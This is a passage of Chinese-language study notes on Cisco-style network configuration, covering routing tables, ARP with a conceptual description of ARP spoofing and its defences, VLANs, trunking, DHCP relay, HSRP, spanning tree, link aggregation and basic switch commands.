S\t40.1.1.1&#x2F;24\t30.1.1.2(2)：后面的(2)表示，将S的管理距离值变为2，这样查询的时候会优先查询上面一条；且当上面那条正常出现的情况下（网线无损坏且端口为up），后面优先级较低的条目会被隐藏（因为俩条目的网段冲突了，且第二条优先级低于第一条）。当第一条优先级高的消失之后，第二条才会出现，所以第二条也称为**浮动路由**\n–路由表的查询顺序：​\t\t\t\t路由表的查询顺序由管理距离值决定，其中：C的管理距离值为0；S的管理距离值为1；S*的管理距离值为无穷大；​\t\t\t\t管理路由值越小，优先级越大；\n–路由器的工作原理​\t\t1）一个帧到达路由，路由首先检查帧的目标MAC地址是否是自己，不是则丢弃（广播除外），是则解封装，并将ip包送到路由器内部；​\t\t2）路由器检查ip包头中的目标IP地址，并匹配路由表，获取下一跳的ip地址，若匹配失败，则丢弃，并向源ip回馈错误信息；匹配成功，则将ip包路由到出接口；​\t\t3）封装帧，首先将出接口的MAC地址作为源MAC地址封装到帧头，然后检查路由器中的ARP缓存表，是否有下一跳ip对应的MAC地址，若有则直接将其作为目标MAC封装到帧头；若没有，则发送ARP广播请求下一跳的MAC，获取到下一跳的MAC地址并缓存，接着将其作为目标MAC封装到帧头；​\t\t4）将帧发送出去\n–相关命令：#windows 命令1. tracert www.baidu.com\t#检查从当前ip到目标ip需要经过几跳（几个路由器）2. arp -a  #查看本机的ARP缓存表3. arp -d  #清除本机ARP缓存4. arp -s ip MAC地址\t#ARP绑定&#x27;&#x27;&#x27;arp缓存是保存在内存中的,开机时生效，一段时间不通信，自动会删除记录；若是同时有多个主机应答，则遵循&quot;谁后到就使用谁的&quot;,后面来的会覆盖前面的&#x27;&#x27;&#x27;5. netsh interface ipv4 show neighbors6. netsh interface ipv4 set neighbors 11 10.0.0.178 MAC地址#路由器命令1. ip route ip 子网掩码 &#123;address | interface&#125;  #设置直连路由条目，最后一个参数建议写address,也就是下一跳地址2. ip route 0.0.0.0 0.0.0.0 address 2\t#设置默认路由，最后设置为2 代表设置管理路由距离，也就是设置优先级;加上最后一个优先级参数，则该路由也可以称为浮动路由3. show ip route #查看路由表4. arp ip mac地址 arpa f0/0\t#全局配置模式下，网关路由器绑定ARP,交换机命令一样5. int range f0/1 - 48\t\t#多接口批量处理#配置子接口（vlan时用到）6. int f0/0.1\t#在f0/0接口下，创建一个子接口0.1并进入该子接口，该子接口能正常配置ip，但主接口不能配置7. encapsulation dot1q 10\t#与上条命令搭配使用，给子接口配置识别vlan标签的功能，最后一个参数代表其能识别的vlan，且只能识别一种#给路由器配置dhcp功能8. ip dhcp excluded-address 10.1.1.1 10.1.1.99 #全局配置模式下，使用该命令，将某些地址排除9. ip dhcp pool v10 #在使用上一条命令之后，使用这条命令创建v10的地址池10. network 10.1.1.0 255.255.255.0 #配置网段11. default-router 10.1.1.254  #配置网关12. dns-server 40.1.1.1 #配置dns13. lease 2 2 2 #配置租约#删除路由器的dhcp功能,下面俩条命令一起使用即可14. no ip dhcp excluded-address 10.1.1.1 10.1.1.9915. no ip dhcp pool v1016. ip help-address ip地址\t#首先进入路由子接口，使用该命令将dhcp广播进行单播转发到某个ip地址#交换机命令1. vlan ID,ID  或者\tvlan ID-ID  #在全局配置模式下，前一条命令用于创建多个VLAN频段，后一条创建的多个连续频段；软件不支持同时创建多个vlan&#x27;&#x27;&#x27;输入上面的命令之后会进入一个特殊的模式：VALN配置模式，在该模式下：&#x27;&#x27;&#x27;2. [name 自定义名称]\t#在VLAN配置模式下可以配置自定义名称（给使用者看，实际的起作用的还是ID）,且该配置是可选，若不配置，直接输入 exit 退出该模式即可3. show vlan brief #查看vlan表的简要信息4. switchport access vlan ID\t#进入对应的端口，然后使用该命令将该端口加入到对应ID的vlan中&#x27;&#x27;&#x27;注意：同一个交换机上的入口和出口两个端口必须要在同一个vlan下，数据才能通过&#x27;&#x27;&#x27;#配置trunk5. switchport trunk encapsulation dot1q/isl\t#进入需要配置成trunk的端口，然后使用该命令将该端口设置为trunk,最后一个参数代表trunk标签的类型，二选一即可（需要交换机支持）,这条命令是可选的，用于选择标签的类型，若是交换机不支持该命令，说明交换机只支持802.1q标签，此时直接使用下一条命令即可6. switchport mode trunk\t#在完成上面的命令后，紧接着使用这条命令，将该端口的模式设置为trunk，后期若是不需要将该端口作为trunk端口，而是要连PC,则需要在该端口再次使用该命令，只不过需要将最后的参数替换为 access#交换机配置vtp7. vtp mode server\t#在全局配置模式下，将该交换机设置为vtp服务器8. vtp domain xin  #设置域名名称9. vtp password 123.com  #设置密码&#x27;&#x27;&#x27;以上三条是配置服务器&#x27;&#x27;&#x27;10. vtp mode client #设置该交换机为客户端11. vtp domain xin\t#设置域名名称12. vtp password 123.com #设置密码&#x27;&#x27;&#x27;以上三条配置vtp客户端&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;注意：服务器和客户端的域名名称和密码必须一样&#x27;&#x27;&#x27;13. show vtp status #查看vtp的配置信息#三层交换机（核心交换机命令）14. ip routing  #开启路由器三层交换功能15. int vlan 10\t\tip add 10.1.1.254\t\tno shut\t\t#开启三层交换功能后，配合上面三条命令，让交换机和路由器之间生成一条虚拟的线，实现单臂路由的功能16. int f0/1\t\tno switchport  #将交换机端口升级为路由端口（三层端口），接着这个端口就能配置ip,最后 no shutdown\n\n–实验：\n\n\n\n（2）ARP协议\n–广播与广播域​\t（1）广播：将广播地址作为目的地址的数据帧​\t（2）广播域：网络中能收到同一个广播的所有节点集合\n​\tMAC地址广播：广播地址为：FF-FF-FF-FF-FF-FF​\tIP地址广播：​\t\t1、255.255.255.255​\t\t2、广播ip地址为相应ip地址的网段的广播地址：如192.168.1.255&#x2F;24\n–什么是ARP协议​\t\tAddress Resolution Protocol：地址解析协议：将一个已知的IP地址解析成MAC地址​\t\t工作流程：​\t\t\t1）首先查看缓存是否由有对应ip的MAC地址，有则直接获取​\t\t\t2）若无，则发送ARP广播​\t\t\t3）对应ip的主机单播应答​\t\t\t4）将获取的MAC地址进行缓存​\t\t注意：ARP协议是内网协议，只在局域网内广播\n–ARP攻击与欺骗​\t\tARP攻击者通过发送虚假伪造的arp报文对受害者进行ARP缓存投毒\n​\t\t1）ARP攻击：​\t\t\t\t单播报文攻击：伪造ARP的单播应答包，使得真正的两台主机之间无法正常通信（伪造假的MAC），或者断网（伪造网关\t\t\t\t\t\t\t\t\t\tMAC），假MAC为无法通信的MAC，即局域网内没有该MAC​\t\t\t\tARP广播攻击：伪造一个ARP广播，里面的源ip和源MAC为网关ip和MAC（伪造的），目标ip随便；该广播的目的是为了让广\t\t\t\t\t\t\t\t\t\t播域中的所有pc都收到该广播，由于ARP协议的贪婪，所有收到该广播主机会将该广播中的源ip和源MAC记录在\t\t\t\t\t\t\t\t\t\t自己主机的ARP缓存中，由于该ip和MAC是伪造的，最终造成所有主机的网关的ip和MAC地址全部被替换成伪造\t\t\t\t\t\t\t\t\t\t的IP和MAC，之后要上网时，主机会先查找缓存，使用假的网关ip和MAC，最终造成无法上网\n​\t\t2）ARP欺骗：介入两台主机之间，通过ARP协议，将自己的MAC地址伪造成目标MAC，将双方的通信消息先经过自己，再由自己\t\t\t\t\t\t\t\t转发给目标主机；主机双方依旧可以正常通信，但是通信数据需要经过中间主机\n\n\n–ARP防御​\t1）静态ARP绑定​\t\t\t手工绑定，在本机上静态配置网关的MAC地址；由于通信是双向的，因此还需要在路由器上静态绑定对应主机的MAC，一般用于服务器，普通的员工主机不建议这样做。\n#windows上静态绑定ARParp -s ip MACnetsh interface ipv4 show neighborsnetsh interface ipv4 set neighbors 11 10.0.0.178 MAC地址\n\n​\t2）ARP防火墙（软件）​\t\t\t打开后，连接网线，会自动在客户机中形成一条静态ARP，内容指向网关；其次，与攻击者一样，向网关发送本机真正的MAC地址，算是一种另类攻击，此时就看谁发送的更多，更快（一般这种防火墙软件会根据攻击者发送的速度来调整自己的速度）！这对网关也是一种负担！\n​\t3）硬件级ARP防御​\t\t\t企业级的交换机会在主机向DHCP服务器获取IP的时候，就在交换机对应的接口上动态绑定主机获取的ip以及其对应的MAC地址，一旦该主机想发ARP报文，交换机的该接口就会将该ARP报文中的信息与之前绑定的信息进行对比，若不匹配，处理结果各有不同，要么丢弃该报文，要么直接将对应接口down掉，只有管理员能打开。​\t\t\t一旦该主机通信的信息中含有自己的ip以及MAC地址就会被交换机记录，除非最开始发送的消息就是伪造的，那这样也只能攻击一个人，且自己也无法上网。​\t\t\t注意：需要交换机支持端口做ARP动态绑定（配合DHCP服务器）\n（3）VLAN（Vitural LAN 虚拟局域网）：二层技术–广播的危害：​\t\t\t\t增加网络&#x2F;终端负担，传播病毒，一些安全性问题\n–如何控制广播：​\t\t\t\t路由器（物理隔离广播）；控制广播 &#x3D; 隔离广播域；​\t\t\t\t路由器隔离广播的缺点：成本高，不灵活\n–采用新的技术VLAN：​\t\t\t\tVLAN 来控制广播；该技术是在交换机上实现的，是通过逻辑隔离划分的广播域；​\t\t\t\t\t\t\t一个 VLAN = 一个广播域  = 一个网段\n–VLAN的类型：​\t\t\t\t（1）静态VLAN：手工配置；基于端口划分的VLAN（同一VLAN下的端口连接的PC能够相互通信）;VALN表中记录的是端口​\t\t\t\t\t\t\t\t\t\t\t\t两台PC能否通信取决于两台PC连接的端口是否在同一个VLAN；PC一旦换了端口，VLAN就可能发生变化​\t\t\t\t\t\t\t\t\t\t\t\t实际一般采用这种\n#静态VLAN的命令1. vlan ID,ID 或 vlan ID-ID\t#在全局配置模式下，使用该命令创建多个vlan频段，前者用于创建多个不连续的频段，后者创建一个连续的频段#查看命令2. show vlan brief\t#查看vlan的简要信息#将端口加入到vlan中&#x27;&#x27;&#x27;思科、锐捷是进入到对应端口再加入，而华为是直接在全局配置下加入，只不过命令中需要带上对应端口&#x27;&#x27;&#x27;3. switchport access vlan ID\t#首先进入到对应的端口，然后使用该命令将该端口加入到对应的vlan中\n\n​\t\t\t\t（2）动态VLAN：手工配置；基于MAC地址划分的VLAN；VLAN表中记录的是主机MAC地址​\t\t\t\t\t\t\t\t\t\t\t\t两台PC能否通信取决于两台PC的MAC地址是否的在同一个VLAN；即使PC换了端口，VLAN也不会发生变\t\t\t\t\t\t\t\t\t\t\t\t化；​\t\t\t\t\t\t\t\t\t\t\t\t虽然灵活，但是维护量大，因此在实际中基本不用\n​\t\t\t\t（3）采用802.1x：基于账号来划分VLAN：过程比较复杂\n​\t\t\t\t注意：交换机最开始默认就有5个vlan：vlan1、vlan1002-1005；第一个是所有交换机端口的默认vlan,后面四个基本淘汰了\n–Trunk：多个交换机连接同一局域网并设置vlan出现的问题\n​\t从上图中可以看出，f0&#x2F;10以及f0&#x2F;9端口都没有配置vlan，因此在这个局域网内，即使第1台PC和第4台PC处于同一vlan，但是当PC1去pingPC4的时候，由于f0&#x2F;10没有配置vlan，导致数据能从f0&#x2F;1进入，但准备从f0&#x2F;10出去的时候，交换机发现f0&#x2F;10端口的vlan并不处于vlan10，因此数据无法出去。\n解决方式：Trunk（中继端口）        中继端口也称为公共端口，它并不属于任何vlan，但允许任何vlan从该端口通过。\n​\t\t此时又出现一个问题：从trunk端口出来的数据怎么判断该数据处于哪个vlan?​\t\t\t通过协议完成vlan识别：在进入trunk端口后，帧会被拆成两部分，并在中间插入一个标签（用于识别该帧属于哪个端口），在出trunk端口时，会将该标签拆除，恢复成原始帧，并通过拆下的标签识别该帧属于哪个vlan.\ntrunk标签：        （1）ISL标签：cisco私有的，标签大小30字节（26+4），在帧两端加入（不拆开帧）        （2）802.1q标签：公有协议，所有厂家都支持，标签大小4字节。属于内部标签（拆开帧，在帧中间插入）\n–配置trunk命令：1. switchport trunk encapsulation dot1q/isl\t#进入需要配置成trunk的端口，然后使用该命令将该端口设置为trunk,最后一个参数代表trunk标签的类型，二选一即可（需要交换机支持）,这条命令是可选的，用于选择标签的类型，若是交换机不支持该命令，说明交换机只支持802.1q标签，此时直接使用下一条命令即可2. switchport mode trunk\t#在完成上面的命令后，紧接着使用这条命令，将该端口的模式设置为trunk，后期若是不需要将该端口作为trunk端口，而是要连PC,则需要在该端口再次使用该命令，只不过需要将最后的参数替换为 access\n\n–交换机端口链路类型​\t\t（1）接入端口：也称为access端口，一般用于连接PC，只能属于某一个Vlan，也只能传输1个Vlan的数据​\t\t（2）中继端口：也称为trunk端口，一般用于连接其它交换机，属于公共端口，允许所有的vlan的数据通过\n–Vlan总结​\tVlan是二层技术，但是路由器配置不了Vlan表\n（4）单臂路由​\t\t之前的vlan技术是用于控制广播域；不同的vlan之间无法通信，因此最好设置成1个vlan对应一个网段；\n–实现不同Vlan之间的通信（通过路由实现）​\t\t\t\t1）配置子接口（f0&#x2F;0.1 、f0&#x2F;0.2），每个子接口都是一个网段的网关;​\t\t\t\t2）并且给子接口配置识别trunk标签的功能，因为F0&#x2F;3需要配置成trunk端口，而路由器是无法配置trunk端口，但是路由器能识别trunk标签。配置识别标签的命令为：encapsulation dot1q 10（图片中是错误的）\t#最后一个参数代表识别的标签；配置了之后则该子接口只能识别vlan为10的帧，即只让vlan为10的数据通过\n\n–单臂路由总结​\t\t1.由于路由器只接了一根线实现了俩个子接口，所以称为单臂（已被淘汰）；​\t\t2.也可以直接接两根线，并将两根线设置不同vlan，也能实现同样的效果（耗费资源）；​\t\t3.不同vlan之间的通信是靠路由来实现的\n​\t\t缺点：​\t\t\t1）只靠一根线进行通信，容易出现瓶颈​\t\t\t2）容易发生单点物理故障（所有的子接口依赖同一个总物理接口）​\t\t\t3）vlan间通信的每一个帧都进行单独路由\n–交换机配置VTP#1.vtp服务器的设置，裁剪功能默认开启1. vtp mode server  #在全局配置模式下，使用该命令将该交换机的设置成vtp的服务器2. vtp domain xin\t#使用上面的命令之后，设置域名名称3. vtp password 123.com\t#使用上一条命令之后，设置该交换机的密码&#x27;&#x27;&#x27;以上三条命令用于将某台交换机设置成vtp 服务器，并设置域名和密码&#x27;&#x27;&#x27;4. show vtp status\t#查看vtp的配置#2.vtp 客户端的设置1. vtp mode client\t#在全局配置模式下，使用该命令将交换机设置为vtp客户端2. vtp domain xin #使用上条命名后，设置域名3. vtp password 123.com  #设置密码\n\n\n\n–配置DHCP服务的方式1）在三层路由器上配置dhcp\n1. ip dhcp excluded-address 10.1.1.1 10.1.1.99\t#在创建地址池的时候，先把一些地址排除，此处将10.1.1.0网段的1-99号地址都排除了，其它人获取不到，该命令可以执行多次，用于排除多个地址2. ip dhcp pool v10\t\t#在全局配置模式下，使用该命令创建地址池，名称为v103. network 10.1.1.0 255.255.255.0\t\t#接着配置分发的ip网段4. default-router 10.1.1.254\t#配置网关5. dns-server 40.1.1.1\t\t#配置dns6. lease 2 2 2\t\t#最后配置租约，最后三个参数的为租约时间，此处代表 2天 2小时 2分钟#删除路由器的DHCP服务,以下俩条命令一起使用，则对应的dhcp服务就被删除了7. no ip dhcp excluded-address 10.1.1.1 10.1.1.998. no ip dhcp pool v10\t\n\n2）在服务器上配置dhcp–dhcp中继技术\n​       当局域网通过vlan划分了不同的网段，而服务器处于某一个网段，此时，其它网段的PC获取ip的discover广播包到不了服务器，因此获取不到ip地址，因为广播最终只能到达同一广播域中的设备以及路由器。此时需要对路由器的端口做一些配置。\n#在路由器端口上配置dhcp广播单播转发1. ip helper-address 40.1.1.1\t#进入某一个子接口，该命令将该子接口的dhcp广播单播转发到40.1.1.1,最后一个参数为单播转发地址\n\n\n\n–实验1.全网互通\n\n2.实验二\n\n要求：在上图的基础上，再加上50和60网段，依旧是全网互通\n\n（5）ICMP协议​\t作用：网络探测与回馈机制​\t\t1）网络探测​\t\t2）路由跟踪​\t\t3）错误反馈\n–ICMP协议的封装格式\n​\t1）ICMP头：ICMP类型、代码\n​\t\t一般来说ICMP类型和代码字段是一样的，但是当ICMP为3，目标主机不可达时，后面的代码代表不可达的原因，此时代码与ICMP类型不一致\n​\t\t（1）ICMP类型字段​\t\t\t\t\t8：代表ping请求​\t\t\t\t\t0：代表ping应答​\t\t\t\t\t3：代表目标主机不可达​\t\t\t\t\t11：TTL超时\n（6）三层交换机（替代单臂路由）：也叫核心交换机\n–三层交换机的组成​\t三层交换机 &#x3D; 三层路由 + 二层交换机​\t其中三层路由引擎是可以关闭（no ip routing）或开启的 \n–三层交换机的优点（与单臂路由相比）​\t1）解决了网络瓶颈问题​\t2）解决了单点故障（虚拟接口不再依赖任何物理接口）​\t3）解决了需要对发送的每个帧都进行单独路由：一次路由，永久转发​\t\t\t解释：当需要跨网段通信时，此时若需要发送大量帧，则只有第一个帧需要经过繁琐的变换MAC地址的过程，后面的帧则不需要；因为一旦第一个帧经过繁琐的过程后，三层交换机会形成俩个表 CEF表 和 邻接关系表，两张表的记录一一对应；后续发送的帧，三层交换机会检查其中的目标ip地址并与CEF表中进行匹配，匹配成功则直接将帧头用邻接关系表中对应的MAC地址替换。\n–开启三层路由功能：三层交换机上起虚接口（配置vlan的网关）1. ip routing  #在全局配置模式下，使用该命令开启三层路由功能（三层路由引擎）2. int vlan 10 \tip add 10.1.1.254\tno shut\t\t#以上三条命令，用于开启虚拟端口，使得交换机与路由器之间形成一条虚拟的线\n\n–将三层路由器的端口升级为路由端口1. int f0/x\tno switchport  #将该端口升级为路由端口\n\n–实验\n（7）HSRP协议&#x2F;VRRP协议：热备份路由协议​\t当一个网络中有俩个网关（俩路由器）时，需要将其中一个网关用于备份，这样当主网关故障时，备用网关能继续起作用；​\t其中HSRP协议是思科私有的，而VRRP协议是公有的，但俩者原理差不多\n–配置步骤：​\t\t1.在对应端口上开启HSRP协议，并加入到同一个HSRP组中（组号相同即可，组号范围：1-255，组号没有大小之分，先后之分）​\t\t2.一旦俩个端口加入到同一组之后，此时该组会出现一个虚拟的路由器（同时具备一个虚拟IP），此时该组有三个网关，对应三个ip​\t\t\t\tHSRP组：​\t\t\t\t\t（1）成员：虚拟路由器（老大）；活跃路由器（老二）；备份路由器（老三）；若还有，则统称为：其它路由器​\t\t\t\t\t（2）HSRP优先级：1-255：数字越高越容易被选举为活跃路由器，越低越容易被选举为备份路由器；默认：100​\t\t\t\t\t（3）组内成员之间的通信：组内成员定时发送hello包来交流，默认每隔3秒​\t\t\t\t\t注意：用户的网关指向虚拟路由器，但是用户的流量是通过活跃路由器走的\n​\t\t\t\t当活跃路由器宕机之后：备份路由会每隔3秒向活跃路由发送hello包，若10秒没有收到回复，那么备份路由会向虚拟路由发送一个hello包，此时备份路由取代活跃路由；若是此时原\t\t\t\t\t\t\t\t\t\t\t\t\t活跃路由正常重新启动，那么此时的升级为活跃路由的备份路由会自动让位\n​\t\t\t\t\t（4）占先权：一般给备份和其它路由配置；若是备份路由器配置了该权限，一旦向活跃路由发送的hello包没有回复或对方优先级比自己低，则备份路由直接升级为活跃路由,\t\t\t\t\t\t\t不会等待10秒​\t\t\t\t\t（5）配置跟踪track，跟踪外网端口状态，一旦外网端口down掉，则自降优先级\n–配置命令#配置组号1. standby 组号 ip 192.168.1.254\t\t#进入某个端口，使用该命令将端口加入热备份组，同时指定虚拟IP2. standby 组号 priority 200\t\t\t#进入某个端口，使用该命令设置端口优先级3. standby 组号 preempt\t\t\t\t\t#配置占先权4. standby 组号 track f0/1\t\t\t#配置跟踪track5. show standby brief\t\t\t\t#查看配置\n\n–STP协议​\t\t生成树协议：防止二层设备之间的物理环路造成广播风暴；具体的解决方式是二层设备之间进行通信，最后将某个端口逻辑down掉，以免形成回路\n–PVST协议（思科私有的协议）​\t\t每个vlan生成树协议：二层设备间通信并分析每个vlan间是否有物理回路，并基于vlan来down掉某个端口（也就是说某个vlan可能无法通过，但是其它的vlan依旧可以通过）\n​\t\t注意：该协议是思科私有的，公有的协议是MST（多生成树协议），且该协议一般与HSRP共同使用\n–实验实验一\n\n实验二\n\n8）补充：链路聚合（LACP协议）\n是一种实现链路动态汇聚的协议；采用LACPDU的协议报文来交互本端（Actor）和对端（Partner）的聚合信息，最终完成链路聚合。\n\n在思科设备上有其私有的一种LACP协议：PAgP（与LACP协议有些不同）\n\n标准的协议为：LACP（基于802.3）的LACP\n\n链路聚合的模式：\n\nactive：LACP的主动模式\npassive：LACP的被动模式\nauto：PAgP独有的主动模式\ndesirable：PAgP被动模式\non：以太网通道\n\n\nLACP的配置：\n\n首先进入需要汇聚的端口（必须是trunk端口），接着使用下面的命令，指定协议：\nchannel-protocol lacp\n\n接着指定聚合模式（也是在端口下使用）\nchannel-group 1 mode active\t\t&#x27;&#x27;&#x27;参数 1 表示组号，active 表示设置为 主动模式\n\n将聚合通道配置为trunk\nint port-channel 1\t\t\t\t&#x27;&#x27;&#x27;进入组号 1\tsw mode trunk\n\n一些其它命令：查看命令\nshow int f0/1 sw   &#x27;&#x27;&#x27;查看的当前端口的状态show spanning-tree\t\t&#x27;&#x27;&#x27;查看生成树，也可以查看端口是否up\n\n配置成以太网通道：另一种汇聚方式，但是有限制（只能汇聚8条）\n#进入端口，直接设置模式为 on, 不用先指定协议channel-group 1 mode on#若要设置成trunk,可以直接进入group1端口int port-channel 1\tsw mode trunk\t\t\t&#x27;&#x27;&#x27;在group 1 中设置trunk ，则其中涉及的所有端口都将被设置为trunk \n\n\n\n4）数据链路层：​\t\t\t\t加上MAC子层和FCS，MAC子层里面包含源mac地址和目标mac地址，这俩个MAC地址主要给交换机看的；​\t\t\t\tFCS固定长度4个字节，其作用与Hash算法一样，校验数据完整性，只不过这里使用循环校验算法CRC算法；​\t\t\t\t交换机工作在数据链路层；​\t\t\t\t输出的数据称为数据帧(frame)，MAC子层也称为帧头，FCS也称为帧尾​\t\t\t\t代表设备：交换机，网卡；网卡负责生成帧，发送给交换机​\t\t\t\t协议：MAC子层协议，（数据从网络层流向数据链路层时，必须经过MAC子层协议来封装帧头和帧尾）\n帧结构：​\t\t\t\t\t帧协议：有线网卡：802.3； 无线网卡：802.11​\t\t\t\t\t帧头：目标MAC，源MAC地址，类型；其中单个MAC地址占48bit（6字节），类型占16bit（2字节）​\t\t\t\t\t\t\t\t其中类型只有两个值：0x0800（IP协议）和0x0806（ARP协议）；​\t\t\t\t\t\t\t\t类型的作用在于：识别上层协议，为上层提供服务​\t\t\t\t\t帧尾：占4字节​\t\t\t\t\tMTU（最大传输单元）：1500字节（国内）​\t\t\t\t\t因此，整个帧的最大长度为：6+6+2+1500+4&#x3D;1518字节​\t\t\t\t\t帧结构图如下：\n\n交换机工作原理：​\t\t\t\t\t\t交换机收到一个数据帧之后：​\t\t\t\t\t\t\t首先学习帧中的源MAC地址及对应端口，形成MAC地址表；​\t\t\t\t\t\t\t然后检查帧中的目标MAC地址，并在记录的MAC地址表中匹配：​\t\t\t\t\t\t\t\t\t（1）若表中有匹配项，则单播转发​\t\t\t\t\t\t\t\t\t（2）若表中无匹配项，则除接收端口外广播转发\n\n​\t\t\t\t\t\t其它知识：​\t\t\t\t\t\t\t\t\t\t1）交换机通过帧中的源MAC地址学习MAC地址表；\t​\t\t\t\t\t\t\t\t\t\t2）一旦某台主机拔掉网线，与其相连的交换机MAC地址表在300s（老化时间，可修改）之后就会删除该主机\t\t\t\t\t\t\t\t\t\t\t\t 的MAC地址记录；​\t\t\t\t\t\t\t\t\t\t3）若是某台主机换了网线，则其相连的MAC地址表会立即更新，而该网线之前的主机MAC地址记录会在\t\t\t\t\t\t\t\t\t\t\t\t 300s后自动删除；​\t\t\t\t\t\t\t\t\t\t4）E，F，G，Te 分别对应10Mb，100Mb，1000Mb，10000Mb传输速率​\t\t\t\t\t\t\t\t\t\t5）F0&#x2F;1：其中0表示模块号，1表示该模块的接口号​\t\t\t\t\t\t\t\t\t\t6）接口速率自适应：1000&#x2F;100&#x2F;10M自适应：表示其工作模式可以兼容三种速率且自适应切换；若自适应失败，\t\t\t\t\t\t\t\t\t\t      则该网线的两端无法收发数据（处于down状态）​\t\t\t\t\t\t\t\t\t\t接口状态：up&#x2F;down​\t\t\t\t\t\t\t\t\t\t\t其中down有三种可能：​\t\t\t\t\t\t\t\t\t\t\t\t（1）人工down掉​\t\t\t\t\t\t\t\t\t\t\t\t（2）速率不匹配​\t\t\t\t\t\t\t\t\t\t\t\t（3）双工模式不匹配（双工duplex）\n​\t\t\t\t\t\t\t\t\t\t双工模式：单工、半双工、全双工​\t\t\t\t\t\t\t\t\t\t\t\t（1）单工：只能单向通信；比如bb机，收音机（基本不用）​\t\t\t\t\t\t\t\t\t\t\t\t（2）半双工：可以双向通信，但不能同时通信，同一时间内只能单向通信​\t\t\t\t\t\t\t\t\t\t\t\t（3）全双工：可以双向通信，且支持双方同时进行通信（普遍使用）\n交换机&#x2F;路由器基本工作模式及命令：使用工具模拟（PT软件）​\t\t\t\t\t\t第一次配置网络设备，需要使用console线；并在PC上使用软件“超级终端”或其它软件\n1）工作模式:5大模式​\t\t\t\t\t\t\tswitch &gt;:用户模式： 可以查看交换机的基本简单信息，且不能对配置做任何修改​\t\t\t\t\t\t\tswitch #:特权模式：用户模式下使用命令enable进入，该模式下可以查看所有配置，但不能修改配置，除了一些如测\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t试，保存，初始化等操作​\t\t\t\t\t\t\tswitch(config) #:全局配置模式：在特权模式下，使用 configure terminal命令进入全局配置模式；该模式下默认不\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t能查看配置，可以修改配置，且全局生效​\t\t\t\t\t\t\tswitch(config-if) #:接口配置模式：在全局配置模式下，使用interface f0/1进行某个接口的配置（接口配置模\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t 式）；该模式下，默认不能查看配置，可以修改配置，且只对该接口生效​\t\t\t\t\t\t\tswitch(config-line) #:console口配置&#x2F;线&#x2F;控制模式：在全局配置模式下，使用line console 0进入console口配\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t置模式，该模式下，默认不能查看配置，可以修改配置，且只对\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconsole接口生效\n2）交换机命令#一、只要缩写的命令能被唯一识别，可以随意缩写命令，且tab键能补全命令1. enable 简写 en   #一般通过console线进入都是用户模式，使用该命令进入特权模式2. configure terminal 简写：conf t\t#在特权模式下，通过该命令进入全局配置模式3，interface f0/1 简写 int f0/1\t#在全局配置模式下，使用该命令对某个端口进行配置，f0/1为具体端口号4. exit\t\t#退出当前模式，返回上一级模式5. line console 0 简写 line co 0\t#在全局配置模式下，使用该命令进入第一个console接口6. end\t\t#不管当前处于什么模式，使用该命令，直接退回到特权模式（不能在用户模式下使用）7. e?\t\t#显示以 e 开头的命令 8. hostname sw1\t\t#在全局配置模式下，修改当前设备名称9. password xinxin\t\t#切换到console口，使用该命令给交换机设置用户密码为 xinxin ，与下一条命令一起使用10. login\t\t#输完上调命令还不行，还需要再输入这条命令，俩条命令设置完成后，下次连接该交换机需要输入密码11. reload\t\t#特权模式下，使用该命令，重启交换机14. show running-config/startup-config\t\t#在特权模式下，使用该命令查看running-config/startup-config配置文件内容15. enable password xinxin\t#在全局配置模式下，使用该命令可以设置特权模式密码，该密码以明文保存在config中16. enable secret xinxin\t#在全局配置模式下，使用该命令可以设置特权模式密码，且该密码被加密，且当明文密码与加密密码同时配\t\t\t\t\t\t   置，明文密码会失效17. erase startup-config\t#在特权模式下，使用该命令，删除stratup-config配置文件，意味着初始化配置18. show mac-address-table\t#在特权模式下，查看交换机中的MAC地址表19. show ip interface\t\t#在特权模式下，查看当前交换机上的端口列表20. show ip interface brief\t\t#和上调命令一样，只不过加上brief，简要查看；查看端口时，会出现俩个down，前面一个为物理状\t\t\t\t\t\t\t\t态，后面一个为协商状态；若是物理状态为down说明没有PC连接，若是 administratively down则\t\t\t\t\t\t\t\t是人为down,意味着该端口不可使用；协商状态主要由速率是否匹配，双工模式是否匹配21. shutdown\t\t\t#进入某个具体端口，使用该命令，人为down掉该端口22. no shutdown\t\t\t#进入某个人为down掉的端口，使用no命令，删除之前的shutdown命令23. do show running-config \t#在全局配置模式下，默认是不能查看配置，但使用do可以强制查看，且能执行所有特权模式下的命令24. no hostname fei\t\t#在全局配置模式下，使用no 命令，删除之前的配置hostname fei；命令在哪配的在哪使用no 进行删除\t&#x27;&#x27;&#x27;no命令的使用：当命令后面的参数具有唯一性时（即只使用了一次 hostname fei）,那么config中只存在一条该命令，则使用no命令进行删除的时候可以不带 fei ,即直接使用命令 no hostname 即可&#x27;&#x27;&#x27;#二、注意事项\t1)二层设备默认网线端口是可用的(down),三层设备默认人为关闭（administratively dowm）\t2)每次重新登陆交换机，都会在内存中自动创建一个新的干净的running-config文件，此时在该文件上进行的配置，在重启之后就会消失。若要持久化保存内存中running-config文件中的配置，需要在特权模式下，使用下面这条命令：12.copy running-config startup-config    #将内存中的running-cofig文件拷贝到硬盘上的startup-config文件中或者也能使用下面这条(但这条并不是所有的交换机都能使用，有的交换机不支持)：13.write（思科独有，上面一条通用）\t这样的话，交换机开机之后：先去硬盘中查找startup-config 文件，看是否存在，若不存在，则在内存中创建新的干净的running-config文件，若存在的话，则将其复制到内存中并改名为running-config\t#三、快捷键Ctrl + u  : 删除光标前面的所有内容Ctrl + a  : 快速将光标移动到行首Ctrl + e  : 快速将光标移动到行末#四、远程控制交换机\t由于交换机工作在二层，因此无法和路由器一样可以为端口设置ip用于远程管理，但是一般企业级的交换机内部会有一个虚拟接口，该接口连接了一台内置PC,虽然交换机无法配置ip，但是该PC可以配置ip,用于远程管理该交换机25. int vlan 1\t#在全局配置模式下，使用该命令进入虚拟接口1，之后就可以正常为该接口配置ip了26. ip add 10.1.1.253 255.255.255.0\t#进入虚拟接口后，使用该命令配置ip27. no shutdown \t#最后记得手动开启该虚拟接口\t若是需要跨网段控制交换机，则需要再给交换机中的虚拟PC配置网关28. ip default-gateway 